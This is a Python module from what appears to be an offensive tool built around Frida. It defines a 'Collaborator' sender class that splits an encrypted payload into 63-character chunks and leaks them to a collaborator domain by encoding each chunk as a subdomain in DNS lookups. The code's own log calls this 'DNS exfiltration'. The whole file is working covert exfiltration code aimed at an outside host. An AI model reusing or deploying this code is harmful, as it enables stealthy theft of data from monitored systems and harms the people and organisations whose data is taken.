from senders.sender import Sender
import logging as log
import socket
import uuid

class Collaborator (Sender):

    def __init__ (self, collab_url):
        """
        Constructor

        @param collab_url: string
                        Collaborator URL to send the data via DNS requests.
        """
        self.collab_url = collab_url


    def send_data (self, encrypted_b64):
        """
        Sends the data to the appropriate redirector. This works in a best-effort basis;
        meaning, it doesn't (and probably can't even if it wanted to) verify the message
        arrived at the destination.

        This method doesn't return anything.

        @param enc_b64: bytes
                        Base64-encoded and encrypted payload created by Frida.
        """
        base_url = self.collab_url
        # The padding character, =, causes problems when resolving the domain name, but
        # the rest, [A-Za-z0-9-_], are fine to be used
        data = encrypted_b64.decode ("utf-8").strip ("=")
        event_id = uuid.uuid4 ().hex

        # According to IDNA2008 (RFC 5890), each part of the domain can consist of, at
        # most, 63 Bytes. Since we're not dealing with unicode, we can safely split the
        # payload into chunks of 63 characters
        packet_size = 63

        # TODO: edge-case: a chunk ends or starts with `-` (not allowed by the standard)
        chunks = [
            data [ i : i + packet_size ]
            for i in range (0, len (data), packet_size)
        ]

        num_chunks = len (chunks)

        for idx, item in enumerate (chunks):

            log.debug (f"Sending chunk {idx}/{num_chunks}: {item}")

            # Format of the sent request:
            #   <data>.<current_index>.<total_items>.<event_id>.<base_collaborator_domain>
            #
            # Note that <current_index> is a 0-based index
            try:
                socket.gethostbyname (
                            item
                    + "." + str (idx)
                    + "." + str (num_chunks)
                    + "." + event_id
                    + "." + base_url
                )
            except socket.gaierror as e:
                # TODO: maybe wait and retry later (?)
                log.error ("Couldn't send the chunk: " + e.strerror)

        log.debug ("DNS exfiltration finished")

